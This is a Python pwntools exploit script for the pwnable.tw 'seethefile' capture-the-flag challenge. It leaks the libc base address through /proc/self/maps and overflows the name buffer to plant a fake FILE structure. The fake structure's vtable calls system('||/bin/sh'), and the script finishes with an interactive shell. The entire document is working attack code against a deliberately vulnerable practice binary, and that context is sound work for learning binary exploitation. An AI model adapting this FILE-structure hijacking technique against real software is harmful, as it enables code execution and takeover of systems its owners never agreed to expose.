from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 1
ElfPath = './seethefile'
LibcPath = 'libc_32.so.6'
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10200'

elf = ELF(ElfPath)
if debug:
    sh = process(ElfPath)
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
       libc = ELF(LibcPath)

def openfile(path):
    sh.sendlineafter('choice :','1')
    sh.sendlineafter('see :',path)
    
def readfile():
    sh.sendlineafter('choice :','2')

def writefile():
    sh.sendlineafter('choice :','3')


def closefile():
    sh.sendlineafter('choice :','4')

def exitfile(name):
    sh.sendlineafter('choice :','5')
    sh.sendlineafter('name :',name)

openfile('/proc/self/maps')
readfile()
writefile()
recv = sh.recvuntil('\n---',drop = True)
readfile()
writefile()
recv += sh.recvuntil('\n---',drop = True)
recvline = recv.split('\n')

libc_addr =int(recvline[5][:8],16)
system_addr = libc.symbols['system']+libc_addr

log.info('------->libc addr:{:#X}'.format(libc_addr))
log.info('------->system addr:{:#X}'.format(system_addr))
buf_addr = 0x804B260

payload = p32(0) + p32(0) + p32(system_addr)
payload = payload.ljust(0x20,'\x00')
payload += p32(buf_addr+0x24) + p32(0xffffdfff) +'||/bin/sh\x00'
payload = payload.ljust(0x24 + 0x94,'\x00')
payload += p32(buf_addr)
if debug:
    #gdb.attach(sh)
    pass
exitfile(payload)

sh.interactive()
sh.close()
